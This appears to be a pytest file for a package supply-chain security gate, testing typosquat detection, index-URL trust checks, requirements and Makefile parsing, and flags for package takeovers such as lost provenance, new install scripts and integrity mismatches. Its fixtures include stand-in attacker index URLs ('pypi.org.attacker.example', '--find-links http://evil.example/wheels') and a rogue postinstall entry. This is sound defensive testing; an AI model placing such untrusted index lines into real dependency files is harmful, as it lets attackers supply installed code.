from pathlib import Path

from gate import core, s1, signals
from gate.findings import Finding


def test_name_proximity_rules():
    lit = s1.S1Config.literal()
    assert s1.name_proximity("pypi", "reqeusts", lit) == "requests"      # transposition
    assert s1.name_proximity("pypi", "requestss", lit) == "requests"     # edit distance 1
    assert s1.name_proximity("pypi", "typingextensions", lit) == "typing-extensions"  # separator
    assert s1.name_proximity("pypi", "requests", lit) is None            # itself
    assert s1.name_proximity("pypi", "Typing_Extensions", lit) is None   # PEP 503 same name
    ch = s1.S1Config.charitable()
    assert s1.name_proximity("pypi", "tomli", ch) is None  # popular names are exempt


def test_url_trust_literal_substring_vs_host():
    bad = "https://pypi.org.attacker.example/simple"
    assert s1._url_trusted(bad, s1.PYPI_TRUSTED, "substring")      # the literal weakness
    assert not s1._url_trusted(bad, s1.PYPI_TRUSTED, "host")
    assert not s1._url_trusted("http://pypi.org/simple", s1.PYPI_TRUSTED, "host")  # plain http


def test_requirements_and_make(tmp_path: Path):
    (tmp_path / "base.txt").write_text("--find-links http://evil.example/wheels\nx==1.0\n")
    (tmp_path / "req.txt").write_text("-r base.txt\n--extra-index-url http://localhost:8503/\ny\n")
    r = s1._read_requirements(tmp_path / "req.txt", s1.S1Config.charitable(), set())
    assert r["index"] == ["http://localhost:8503/"] and r["find_links"]
    assert set(r["specs"]) == {"x==1.0", "y"}
    (tmp_path / "Makefile").write_text("export PIP_CONFIG_FILE := ./pip.conf\n"
                                       "setup: deps\n\t@pip install -r req.txt\ndeps:\n\techo hi\n")
    (inv,) = s1.expand_make(tmp_path, "setup", {})
    assert inv.req_files == ["req.txt"] and inv.env["PIP_CONFIG_FILE"] == "./pip.conf"


def test_literal_ignores_launches_and_make(tmp_path: Path):
    lit = s1.S1Config.literal()
    assert s1.check("npx -y azurecore", tmp_path, lit) == []
    assert s1.check("make setup", tmp_path, lit) == []


def test_decide_policy():
    assert core.decide([]).decision == "allow"
    d = core.decide([Finding("S5", "tool_drift", "warn", "p", "x"),
                     Finding("gate", "version_drift", "info", "p", "y")])
    assert d.decision == "warn" and d.reason.startswith("S5 tool_drift")
    d = core.decide([Finding("S5", "a", "warn", "p", "x"), Finding("S2", "b", "block", "p", "y"),
                     Finding("S4", "c", "block", "p", "z")])
    assert d.decision == "block" and d.reason == "S2 b: y (+1 more)"


def _entry(**kw):
    e = {"ecosystem": "npm", "name": "pkg", "version": "1.0.0", "integrity": "sha512-old",
         "archive": "x.tgz", "installScripts": [],
         "provenance": {"sourceRepository": "https://github.com/a/b",
                        "workflowPath": ".github/workflows/release.yml", "builder": "gha",
                        "digest": "sha256:aaa"},
         "publisher": {"publisher": "GitHub Actions", "maintainers": ["alice"]},
         "tools": {"hash": "sha256:old", "method": "static", "names": ["read"]}}
    e.update(kw)
    return e


def _patch(monkeypatch, target, ident=None, tools=("sha256:old", ["read"])):
    monkeypatch.setattr(signals, "resolve", lambda eco, pkg, pinned: target)
    monkeypatch.setattr(signals, "_identity", lambda eco, pkg, v: ident)
    monkeypatch.setattr(signals, "static_tools", lambda eco, pkg, v: tools)


def test_signals_rug_pull(monkeypatch):
    target = {"version": "1.0.1", "integrity": "sha512-new", "publisher": "mallory",
              "install_scripts": {"postinstall": "node x.js"}}
    _patch(monkeypatch, target, ident=None, tools=("sha256:new", ["read", "exfil"]))
    got = {f.check: f.severity for f in signals.check("npm", "pkg", None, _entry())}
    assert got == {"version_drift": "info", "provenance_lost": "block", "ci_to_human": "warn",
                   "new_install_script": "block", "tool_drift": "warn"}


def test_signals_honest_update_and_migration(monkeypatch):
    target = {"version": "1.1.0", "integrity": "sha512-new", "publisher": "GitHub Actions",
              "install_scripts": {}}
    _patch(monkeypatch, target, ident={"digest": "sha256:aaa"})
    got = [f.check for f in signals.check("npm", "pkg", None, _entry())]
    assert got == ["version_drift"]
    # human -> CI migration is not a publisher alarm
    e = _entry(publisher={"publisher": "alice", "maintainers": ["alice"]})
    assert [f.check for f in signals.check("npm", "pkg", None, e)] == ["version_drift"]


def test_signals_same_version_integrity(monkeypatch):
    _patch(monkeypatch, {"version": "1.0.0", "integrity": "sha512-tampered"})
    (f,) = signals.check("npm", "pkg", None, _entry())
    assert f.check == "integrity_mismatch" and f.severity == "block"
    _patch(monkeypatch, {"version": "1.0.0", "integrity": "sha512-old"})
    assert signals.check("npm", "pkg", None, _entry()) == []
